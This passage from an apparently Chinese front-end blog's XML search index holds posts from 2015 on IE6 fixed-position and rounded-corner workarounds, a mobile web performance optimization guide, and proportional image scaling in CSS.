IE 6]&gt;&lt;style type="text/css"&gt;html &#123;/*这个可以让IE6下滚动时无抖动*/background: url(about:black) no-repeat fixed&#125;#demo_t, #demo_b, #demo_l, #demo_r &#123;position: absolute;&#125;#demo_t, #demo_b &#123;/*这个解决body有padding时，IE6下100%不能铺满的问题*/width: expression(offsetParent.clientWidth);&#125;/*下面三组规则用于IE6下top计算*/#demo_l, #demo_r &#123;top: expression(offsetParent.scrollTop + 300);&#125;#demo_t &#123;top: expression(offsetParent.scrollTop);&#125;#demo_b &#123;top: expression(offsetParent.scrollTop + offsetParent.clientHeight-offsetHeight);&#125;&lt;/style&gt;&lt;![endif]--&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="demo_t"&gt;此处显示 id "demo" 的内容&lt;/div&gt;&lt;div id="demo_b"&gt;此处显示 id "demo" 的内容&lt;/div&gt;&lt;div id="demo_l"&gt;此处显示 id "demo" 的内容&lt;/div&gt;&lt;div id="demo_r"&gt;此处显示 id "demo" 的内容&lt;/div&gt;&lt;div id="content"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;建议在实际使用时，将IE条件注释中的代码放在单独的css文件中，以便节约其他浏览器的流量。]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>position:fixed</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3圆角问题，支持IE6]]></title>
    <url>%2F2015%2F07%2F11%2Fcss3%E5%9C%86%E8%A7%92%E9%97%AE%E9%A2%98%EF%BC%8C%E6%94%AF%E6%8C%81ie6%2F</url>
    <content type="text"><![CDATA[页中圆角应用时比较常见的，但css3的border-radius属性只有IE9才能支持，让人非常的恼火啊~现在给大家一解决方法第一步先加样式，我以行内样式说明：12345678&lt;style type="text/css"&gt;.yJ &#123;-moz-border-radius:4px; /* Firefox */-webkit-border-radius:4px; /* Safari and Chrome */border-radius:4px; /* Opera 10.5+, future browsers, and now also Internet Explorer 6+ using IE-CSS3 */behavior: url(ie-css3.htc);&#125;&lt;/style&gt;第二步，还需要一个文件，记得放在服务器根目录，这个是下载地址 ie-css3.zip第三步，记得应用样式，有圆角的标签加上class=“yJ”；大功告成，感觉不错记得顶我~~兼容主流浏览器，大家可以亲自测试，]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css3圆角 IE6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动前端开发优化指南]]></title>
    <url>%2F2015%2F07%2F10%2F%E7%A7%BB%E5%8A%A8%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E4%BC%98%E5%8C%96%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;移动前端开发由于是在手机上使用，需要考虑到网络信号较差和为用户的流量着想，性能和加载速度就是前端开发人员需要认真考虑的，PC的优化手段同样使用在移动端上。概述1. PC优化手段在Mobile侧同样适用2. 在Mobile侧我们提出三秒种渲染完成首屏指标3. 基于第二点，首屏加载3秒完成或使用Loading4. 基于联通3G网络平均338KB/s(2.71Mb/s)，所以首屏资源不应超过1014KB5. Mobile侧因手机配置原因，除加载外渲染速度也是优化重点6. 基于第五点，要合理处理代码减少渲染损耗7. 基于第二、第五点，所有影响首屏加载和渲染的代码应在处理逻辑中后置8. 加载完成后用户交互使用时也需注意性能优化指南[加载优化]加载过程是最为耗时的过程，可能会占到总耗时的80%时间，因此是优化的重点· 减少HTTP请求&emsp;&emsp;因为手机浏览器同时响应请求为4个请求（Android支持4个，ios5后可支持6个），所以要尽量减少页面的请求数，首次加载同时请求数不能超过4个a) 合并CSS、JavaScriptb) 合并小图片，使用雪碧图· 缓存&emsp;&emsp;使用缓存可以减少向服务器的请求数，节省加载时间，所以所有静态资源都要在服务器端设置缓存，并且尽量使用长Cache（长Cache资源的更新可使用时间戳）a) 缓存一切可缓存的资源b) 使用长Cache（使用时间戳更新Cache）c) 使用外联式引用CSS、JavaScript压缩html、CSS、JavaScript&emsp;&emsp;减少资源大小可以加快网页显示速度，所以要对HTML、CSS、JavaScript等进行代码压缩，并在服务器端设置GZipa) 压缩（例如，多余的空格、换行符和缩进）b) 启用GZip无阻塞&emsp;&emsp;写在HTML头部的JavaScript（无异步），和写在HTML标签中的Style会阻塞页面的渲染，因此CSS放在页面头部并使用Link方式引入，避免在HTML标签中写Style，JavaScript放在页面尾部或使用异步方式加载使用首屏加载&emsp;&emsp;首屏的快速显示，可以大大提升用户对页面速度的感知，因此应尽量针对首屏的快速显示做优化按需加载&emsp;&emsp;将不影响首屏的资源和当前屏幕资源不用的资源放到用户需要时才加载，可以大大提升重要资源的显示速度和降低总体流量PS：按需加载会导致大量重绘，影响渲染性能a) LazyLoadb) 滚屏加载c) 通过Media Query加载预加载&emsp;&emsp;大型重资源页面（如游戏）可使用增加Loading的方法，资源加载完成后再显示页面。但Loading时间过长，会造成用户流失对用户行为分析，可以在当前页加载下一页资源，提升速度a) 可感知Loading(如进入空间游戏的Loading)b) 不可感知的Loading（如提前加载下一页）压缩图片&emsp;&emsp;图片是最占流量的资源，因此尽量避免使用他，使用时选择最合适的格式（实现需求的前提下，以大小判断），合适的大小，然后使用智图压缩，同时在代码中用Srcset来按需显示PS：过度压缩图片大小影响图片显示效果a) 使用智图（ http://zhitu.tencent.com/ ）b) 使用其它方式代替图片(1. 使用css3 2. 使用SVG 3. 使用IconFont)c) 使用Srcsetd) 选择合适的图片(1. webP优于JPG 2. PNG8优于GIF)e) 选择合适的大小（1. 首次加载不大于1014KB 2. 不宽于640（基于手机屏幕一般宽度））减少CookieCookie会影响加载速度，所以静态资源域名不使用Cookie避免重定向重定向会影响加载速度，所以在服务器正确设置避免重定向异步加载第三方资源第三方资源不可控会影响页面的加载和显示，因此要异步加载第三方资源[脚本执行优化]脚本处理不当会阻塞页面加载、渲染，因此在使用时需当注意CSS写在头部，JavaScript写在尾部或异步避免图片和iFrame等的空Src空Src会重新加载当前页面，影响速度和效率尽量避免重设图片大小&emsp;&emsp;重设图片大小是指在页面、CSS、JavaScript等中多次重置图片大小，多次重设图片大小会引发图片的多次重绘，影响性能图片尽量避免使用DataURL&emsp;&emsp;DataURL图片没有使用图片的压缩算法文件会变大，并且要解码后再渲染，加载慢耗时长[CSS优化]尽量避免写在HTML标签中写Style属性避免CSS表达式CSS表达式的执行需跳出CSS树的渲染，因此请避免CSS表达式移除空的CSS规则&emsp;&emsp;空的CSS规则增加了CSS文件的大小，且影响CSS树的执行，所以需移除空的CSS规则正确使用Display的属性Display属性会影响页面的渲染，因此请合理使用a) display:inline后不应该再使用width、height、margin、padding以及floatb) display:inline-block后不应该再使用floatc) display:block后不应该再使用vertical-alignd) display:table-*后不应该再使用margin或者float不滥用FloatFloat在渲染时计算量比较大，尽量减少使用不滥用web字体Web字体需要下载，解析，重绘当前页面，尽量减少使用不声明过多的Font-size过多的Font-size引发CSS树的效率值为0时不需要任何单位为了浏览器的兼容性和性能，值为0时不要带单位标准化各种浏览器前缀a) 无前缀应放在最后b) CSS动画只用 （-webkit- 无前缀）两种即可c) 其它前缀为 -webkit- -moz- -ms- 无前缀 四种，（-o-Opera浏览器改用blink内核，所以淘汰）· 避免让选择符看起来像正则表达式高级选择器执行耗时长且不易读懂，避免使用[JavaScript执行优化]减少重绘和回流a) 避免不必要的Dom操作b) 尽量改变Class而不是Style，使用classList代替classNamec) 避免使用document.writed) 减少drawImage缓存Dom选择与计算每次Dom选择都要计算，缓存他缓存列表.length每次.length都要计算，用一个变量保存这个值尽量使用事件代理，避免批量绑定事件尽量使用ID选择器ID选择器是最快的TOUCH事件优化使用touchstart、touchend代替click，因快影响速度快。但应注意Touch响应过快，易引发误操作[渲染优化]HTML使用ViewportViewport可以加速页面的渲染，请使用以下代码&lt;meta name=”viewport” content=”width=device-width, initial-scale=1″&gt;减少Dom节点Dom节点太多影响页面的渲染，应尽量减少Dom节点动画优化a) 尽量使用CSS3动画b) 合理使用requestAnimationFrame动画代替setTimeoutc) 适当使用Canvas动画 5个元素以内使用css动画，5个以上使用Canvas动画（iOS8可使用webGL）高频事件优化Touchmove、Scroll 事件可导致多次渲染a) 使用requestAnimationFrame监听帧变化，使得在正确的时间进行渲染b) 增加响应变化的时间间隔，减少重绘次数GPU加速CSS中以下属性CSS3 transitions、CSS3 3D transforms、Opacity、Canvas、WebGL、Video）来触发GPU渲染，请合理使用PS：过渡使用会引发手机过耗电增加]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动H5性能优化</tag>
        <tag>移动前端优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS样式控制图片等比缩放]]></title>
    <url>%2F2015%2F07%2F10%2Fcss%E6%A0%B7%E5%BC%8F%E6%8E%A7%E5%88%B6%E5%9B%BE%E7%89%87%E7%AD%89%E6%AF%94%E7%BC%A9%E6%94%BE%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;例如，某容器宽度为950px，内容图片宽高不等，有可能是1000px宽度。为了方便编辑，不用对每张内容图片处理尺寸。图片样式为：1img&#123; max-width:950px; height:auto&#125;但是ie6不识别max-width样式，所以只能对这个强加HACK: _width:950px;若是省略：height:auto，图片只会缩小宽度，做不到等比缩放。当然，有了伟大的CSS3，这个问题就很容易解决了。scale([, ])：指定对象的2Dscale（2D缩放）第一个参数对应X轴，第二个参数对应Y轴。如果第二个参数未提供，则默认取第一个参数的值scaleX()：指定对象X轴的（水平方向）缩放scaleY()：指定对象Y轴的（垂直方向）缩放e.g. transform:scale(1.2)注意，目前需加私有前缀。只可惜只能控制倍数，不可以设值具体数值即：length.]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css3</tag>
        <tag>等比例缩放</tag>
      </tags>
  </entry>
</search>
